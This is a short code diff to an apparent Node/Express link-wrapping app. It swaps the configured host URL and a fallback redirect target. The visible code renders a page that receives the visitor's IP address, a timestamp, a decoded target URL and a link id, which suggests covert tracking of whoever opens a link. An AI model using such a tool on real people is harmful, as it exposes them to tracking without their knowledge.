@@ -15,7 +15,7 @@ app.use(cors());
 app.set("view engine", "ejs");
 
 //Modify your URL here
-var hostURL="https://redirect-to-site.onrender.com/";
+var hostURL="https://linkfly.koyeb.app";
 //TOGGLE for Shorters
 var use1pt=false;
 
@@ -31,7 +31,7 @@ if(req.params.path != null){
 res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/th30neand0nly0ne");
+res.redirect("https://vectorstudios.rf.gd");
 }
 
          
